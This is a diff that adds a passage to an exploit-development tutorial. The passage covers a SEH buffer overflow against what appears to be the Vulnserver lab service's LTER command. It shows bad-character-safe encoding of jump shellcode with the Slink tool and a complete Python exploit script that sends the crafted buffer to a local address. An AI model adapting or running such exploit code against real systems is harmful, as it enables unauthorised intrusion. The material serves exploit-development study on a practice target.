@@ -556,6 +556,93 @@ nasm > call ebx
 00000000  FFD3              call ebx
 ```
 
+So now we have our shellcode that we need encoded: `\x54\x5b\x81\xeb\xb9\x0d\x00\x00\xff\xd3`. 
+
+Since `\x54\x5b` aren't restricted, we need to just prepend these to our encoded shellcode and leave them unencoded. This is a nice trick. If we were to encode `\x54\x5b\x81\xeb\xb9\x0d\x00\x00\xff\xd3` with Slink, our encoded shellcode would be **83 bytes**. However, if we just encode `\x81\xeb\xb9\x0d\x00\x00\xff\xd3`, our encoded shellcode is **52 bytes**, that's a huge difference!
+
+Slink gives us the following encoded shellcode:
+```terminal_session
+Enter your shellcode: \x81\xeb\xb9\x0d\x00\x00\xff\xd3
+Enter shellcode variable name: longJump
+[+] Shellcode size is divisible by 4
+[*] Encoding [d3ff0000]..
+[!] Possible bad character found, using alterantive encoder..
+longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+longJump += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
+longJump += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
+longJump += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
+longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+longJump += "\x50"                 ## push eax
+[*] Encoding [0db9eb81]..
+[+] No bad character found, using default encoder..
+longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+longJump += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
+longJump += "\x05\x40\x75\x54\x06" ## add  eax, 0x06547540
+longJump += "\x50"                 ## push eax
+[*] Shellcode final size: 52 bytes
+```
+
+So we add our `longJump` variable to our exploit which now looks like this: 
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+nSeh = '\x74\x06\x75\x04'
+
+Seh = '\x2b\x17\x50\x62'
+
+espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'
+
+jump = ""
+jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
+jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
+jump += "\x50" 
+
+espAdj2 = '\x54\x58\x2c\x2a\x50\x5c'
+
+longJump = "\x54\x5b"
+longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+longJump += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
+longJump += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
+longJump += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
+longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+longJump += "\x50"                 ## push eax
+longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+longJump += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
+longJump += "\x05\x40\x75\x54\x06" ## add  eax, 0x06547540
+longJump += "\x50"
+
+
+buffer = 'A' * 3427
+buffer += espAdj2
+buffer += longJump
+buffer += 'A' * (3514 - 3427 - len(espAdj2) - len(longJump))
+buffer += nSeh
+buffer += Seh
+buffer += espAdj
+buffer += jump
+buffer += 'D' * (4000 - len(buffer))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("LTER /.../" + buffer)
+print s.recv(1024)
+s.close()
+```
+
 
 
 
